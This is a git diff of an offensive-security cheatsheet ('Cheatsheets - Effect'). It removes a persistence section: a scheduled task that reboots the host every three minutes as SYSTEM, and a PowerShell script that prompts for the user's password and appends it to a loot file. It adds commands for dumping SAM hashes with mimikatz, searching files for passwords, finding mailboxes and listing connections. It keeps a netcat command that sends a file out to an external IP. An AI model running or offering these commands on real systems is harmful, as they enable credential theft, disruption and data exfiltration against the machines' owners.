@@ -5,40 +5,36 @@
 </p>
 
 # Cheatsheets - Effect
-## Table of Contents
-* [Scheduled Tasks](#scheduled-tasks)
-  * [Rolling Reboot](#rolling-reboot) 
+* Dump Passwords
+* Find Password Files
+* Find Emailboxes
+* Get Network Connections
 * [Exfil via Netcat](#exfil-via-netcat)
 
-## Scheduled Tasks
-### Rolling Reboot
+## Dump Passwords
 ```bash
-schtasks.exe /create /tn "Scare" /tr "powershell -c 'C:\scare.ps1'" /sc onlogon /it
-schtasks.exe /create /tn "Effect" /tr "shutdown /r /t 000" /ru "SYSTEM" /sc minute /mo 3  
+mimikatz.exe "lsadump::sam"
 ```
-```pwsh
-# contents of scare.ps1 PowerShell script (plays Imperial March from Star Wars)
-[console]::beep(440,500)
-[console]::beep(440,500)
-[console]::beep(440,500)
-[console]::beep(349,350)
-[console]::beep(523,150)
-[console]::beep(440,500)
-[console]::beep(349,350)
-[console]::beep(523,150)
-[console]::beep(440,1000)
-[console]::beep(659,500)
-[console]::beep(659,500)
-[console]::beep(659,500)
-[console]::beep(349,350)
-[console]::beep(523,150)
-[console]::beep(659,500)
-[console]::beep(349,350)
-[console]::beep(523,150)
-[console]::beep(440,1000)
-Write-Host "[+] Donovia Rulez!"
-Read-Host "[+] Decrypt files with $($env:USERNAME) password" | Out-File -Append C:\Users\Public\loot.txt
-Start-Sleep -Seconds 5
+
+## Find Password Files
+```bash
+findstr /si password *.xml *.ini *.txt (Find passwords)
+```
+
+## Find Emailboxes
+```bash
+dir *.dbx /s 
+```
+
+## Get Network Connections
+```bash
+netstat -ano 
+```
+
+## Exfil via Netcat
+```bash
+nc -nvlp 5050 > stolen.exe
+nc.exe -w3 10.11.12.13 5050 < stealme.exe
 ```
 
 <p align="right">
@@ -46,11 +42,5 @@ Start-Sleep -Seconds 5
   <a href="/CheatSheets/effect.md">Top of Page</a> |
   <a href="/CheatSheets/effect.md#bottom-of-page">Bottom of Page</a>
 </p>
-
-## Exfil via Netcat
-```bash
-nc -nvlp 5050 > stolen.exe
-nc.exe -w3 10.11.12.13 5050 < stealme.exe
-```
 
 ## Bottom of Page
